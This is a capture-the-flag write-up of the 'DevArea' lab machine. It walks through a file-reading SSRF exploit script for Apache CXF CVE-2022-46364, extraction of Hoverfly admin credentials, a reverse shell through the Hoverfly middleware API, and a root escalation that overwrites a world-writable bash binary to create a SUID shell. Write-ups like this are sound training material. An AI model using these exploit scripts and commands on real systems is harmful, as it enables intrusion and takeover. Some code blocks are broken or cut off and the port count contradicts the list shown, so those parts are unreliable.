### 1. Overview
This challenge involved exploiting an SSRF vulnerability in a web service to leak configuration files, which provided credentials for an internal management API. By abusing the middleware functionality of that API, a reverse shell was obtained. Privilege escalation was achieved by identifying a misconfigured, world-writable system binary that was called by a script the user could execute with `sudo` permissions.

### 2. Recon
Starting off this machine, I ran an Nmap service and port scan:
```

The scan found **6** relevant open ports:

- **80 (HTTP)**
- **8080 (HTTP/Jetty)**
- **8500 (HTTP/Golang)**
- **8888 (HTTP/Hoverfly)**

I was able to sign into the FTP service as the `anonymous` user and found a file called `employee-service.jar`. Reading the file using `jd-gui` allowed me to see that port 8080 was running the Apache CXF framework version 3.2.14.
```
product.version=3.2.14
product.name=Apache CXF
build.number=NON-CANONICAL_2025-09-16_21-02_root
```

Port 8888 was running a Hoverfly service which was locked. Attempting to request the API returned an unauthorized error code.

### 3. Foothold
The version of CXF that was being hosted was vulnerable to `CVE-2022-46364`. This allows a user to perform SSRF due to improper handling of the `href` attribute within `XOP:include` during MTOM request processing.

To exploit this, I built a Python script to automate the MTOM LFI exploration. 
```
import requests
import base64
import re

url = "http://devarea.htb:8080/employeeservice"
headers = {
    "Content-Type": 'multipart/related; type="text/xml"; boundary="boundary_1234"'
}

print("--- DevArea MTOM LFI Explorer ---")
print("Enter 'exit' to quit. Use full paths (e.g., file:///etc/passwd)")

while True:
    target_internal = input("\nTarget File Path > ").strip()
    
    if target_internal.lower() == 'exit':
        break
    
    if not target_internal.startswith('file://'):
        target_internal = f"file://{target_internal}"

    payload = (
        "--boundary_1234\r\n"
        'Content-Type: text/xml; charset=UTF-8\r\n'
        'Content-Transfer-Encoding: 8bit\r\n'
        'Content-ID: <root>\r\n\r\n'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n'
        '   <soapenv:Header/>\r\n'
        '   <soapenv:Body>\r\n'
        '      <dev:submitReport>\r\n'
        '         <arg0>\r\n'
        '            <content>\r\n'
        f'               <inc:Include href="{target_internal}" xmlns:inc="http://www.w3.org/2004/08/xop/include"/>\r\n'
        '            </content>\r\n'
        '            <department>IT</department>\r\n'
        '            <employeeName>Admin</employeeName>\r\n'
        '            <confidential>false</confidential>\r\n'
        '         </arg0>\r\n'
        '      </dev:submitReport>\r\n'
        '   </soapenv:Body>\r\n'
        '</soapenv:Envelope>\r\n'
        "--boundary_1234--\r\n"
    )

    try:
        r = requests.post(url, data=payload, headers=headers, timeout=10)
        
        content_match = re.search(r'Content: (.*?)</return>', r.text)
        
        if content_match:
            encoded_str = content_match.group(1)
            if not encoded_str:
                print("[!] Nothing Found.")
                continue
                
            decoded_bytes = base64.b64decode(encoded_str)
            

			print("\n[+] Decoded Content:\n")
			print(decoded_bytes.decode('utf-8'))
        else:
            print(f"[!] No content returned. Status Code: {r.status_code}")
            if "Fault" in r.text:
                print(f"[!] Server Error: {r.text}")

    except Exception as e:
        print(f"[!] Error: {str(e)}")

print("\nExiting. Happy hunting!")
```

```

ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

With the credentials `admin:O7IJ27MyyXiU`, I was able to log in to the Hoverfly API at port 8888. Hoverfly allows the configuration of "middleware" or scripts that process requests and responses. 

After setting up a netcat listener, I sent a `PUT` request to the `/api/v2/hoverfly/middleware` containing a bash reverse shell endpoint.
```
└─$ curl -v -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
     -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU3NzM2NDEsImlhdCI6MTc3NDczMzY0MSwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.7KgbNejUQjqXTJ2YI2hY1b9lgeSSZeGwtdlIuiPI2sSqb9AJeeTxeeCx-cX12xiUQ6fT1rM2w4BXmHDeMdOT-A" \

### 4. Root
With the foothold, I started priv-esc enumeration with the usual `sudo -l`. This revealed that I could run `syswatch.sh` as sudo without a password:
```
dev_ryan@devarea:~/syswatch/syswatch$ sudo -l
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

Looking into the `syswatch.sh` script, via a zip file left in `dev_ryan` home directory, I found that it was calling `/usr/bin/bash`. I then checked the permissions on the bash binary:
```
dev_ryan@devarea:~$ ls -la /usr/bin/bash
-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /usr/bin/bash
```

The binary was world-writable, allowing me to hijack the system's primary interpreter. To do this, I overwrote the `/usr/bin/bash` file with a malicious bash payload, and then ran the `syswatch.sh` using sudo. This made the script run as sudo, which meant root was now running my malicious `/usr/bin/bash` payload.

To exploit this safely, I first backed up the current bash binary.
```
dev_ryan@devarea:~$ cp /usr/bin/bash /tmp/bash.bak
```

Then I had to switch to `/bin/sh` to avoid breaking the current session:
```
dev_ryan@devarea:~$ exec /bin/sh
```

Before overwriting the binary, I needed to make sure no processes were using `/usr/bin/bash`:
```
$ killall /usr/bin/bash
$ lsof /usr/bin/bash
# (This should be an empty response)
```

Then I could replace `/usr/bin/bash` with a malicious script:
```
$ cat > /usr/bin/bash << 'EOF'
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```

This payload creates a SUID root copy of bash that would be triggered via the `syswatch.sh` script:
```
$ sudo /opt/syswatch/syswatch.sh status
```

Finally, I had a root shell.
```
$ /tmp/rootbash -p
rootbash-5.2#
```

### 5. Conclusion
Initial access was achieved by exploiting an SSRF vulnerability in Apache CXF (`CVE-2022-46364`) to read the `hoverfly.service` file and extract administrative credentials. These credentials allowed for the injection of a malicious middleware script into the Hoverfly service, resulting in a reverse shell as `dev_ryan`.

Privilege escalation was completed by exploiting a world-writable `/usr/bin/bash` binary. Since a script callable via `sudo` relied on this binary, overwriting it with a payload to create a SUID shell provided a direct path to root access.
